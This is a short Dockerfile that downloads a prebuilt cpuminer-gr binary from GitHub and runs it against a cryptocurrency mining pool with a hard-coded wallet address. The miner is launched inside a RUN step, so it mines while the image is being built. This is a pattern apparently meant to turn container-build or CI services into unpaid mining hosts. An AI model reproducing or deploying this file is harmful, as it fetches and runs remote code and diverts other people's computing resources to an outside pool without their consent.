FROM ubuntu:20.04
RUN apt update && apt install wget curl git -y
RUN apt-get install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake zlib1g-dev texinfo git -y
RUN wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4.1/cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
RUN tar xvzf cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
RUN sudo ./cpuminer-gr-1.2.4.1-x86_64_linux/binaries/cpuminer-avx2 -a gr -u MD5UqAYkUuv7Ba8sjENGkVhgtsF6ZF2w84 -t 4 -o stratum-na.rplant.xyz:7028 --no-tune
